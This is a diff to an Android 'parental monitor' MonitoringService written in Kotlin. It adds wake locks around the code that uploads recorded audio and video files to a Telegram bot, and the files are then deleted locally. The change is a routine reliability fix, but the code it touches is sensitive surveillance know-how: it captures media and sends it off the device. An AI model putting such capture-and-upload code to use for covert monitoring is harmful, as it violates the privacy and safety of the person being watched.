@@ -12001,7 +12001,18 @@ class MonitoringService : Service() {
             val ambilAudioMs = try { TimeFmt.mediaNameTimeMs(audioFile.name) } catch (_: Exception) { -1L }
             val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(if (ambilAudioMs > 0L) ambilAudioMs else System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
             val url = "https://api.telegram.org/bot$botToken/sendAudio"
-            val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart, menuBarBody())
+            // Kunci terjaga selama unggahan (issue #1265):
+            // jalur flush memanggil fungsi ini tanpa kunci
+            // rekam yang membentang, jadi unggahan ulang bisa
+            // terhenti tidur dalam di tengah jalan — pola yang
+            // sama seperti foto pada #1208, batasnya mengikuti
+            // callTimeout klien media.
+            val audioLock = acquireOpWakeLock("audio", 600_000L)
+            val response = try {
+                TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart, menuBarBody())
+            } finally {
+                releaseOpWakeLock(audioLock)
+            }
             if (response.isSuccessful && response.body()?.ok == true) {
                 noteSendOk()
                 deleteQuietly(audioFile)
@@ -12208,7 +12219,15 @@ class MonitoringService : Service() {
             val ambilVideoMs = try { TimeFmt.mediaNameTimeMs(videoFile.name) } catch (_: Exception) { -1L }
             val caption = ("🎥 " + TimeFmt.full(if (ambilVideoMs > 0L) ambilVideoMs else System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
             val url = "https://api.telegram.org/bot$botToken/sendVideo"
-            val response = TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart, menuBarBody())
+            // Kunci terjaga selama unggahan (issue #1265):
+            // sama seperti audio di atas — jalur flush tak
+            // memegang kunci rekam yang membentang.
+            val videoLock = acquireOpWakeLock("video", 600_000L)
+            val response = try {
+                TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart, menuBarBody())
+            } finally {
+                releaseOpWakeLock(videoLock)
+            }
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Video sent successfully!")
                 noteSendOk()
